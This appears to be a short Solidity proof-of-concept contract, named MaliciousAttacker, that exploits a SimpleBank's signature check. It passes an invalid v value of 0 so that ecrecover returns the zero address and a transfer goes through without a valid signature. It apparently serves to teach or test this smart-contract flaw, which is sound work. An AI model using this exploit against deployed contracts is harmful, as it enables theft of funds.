// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./ecrecover.sol";

contract MaliciousAttacker {
    SimpleBank public simpleBank;

    constructor(address _simpleBank) {
        simpleBank = SimpleBank(_simpleBank);
    }

    function attack(address _to, uint256 _amount, bytes32 _hash, bytes32 _r, bytes32 _s) public {
        // Use invalid v value (not 27 or 28) to force ecrecover to return address(0)
        uint8 _v = 0;
        simpleBank.transfer(_to, _amount, _hash, _v, _r, _s);
    }
}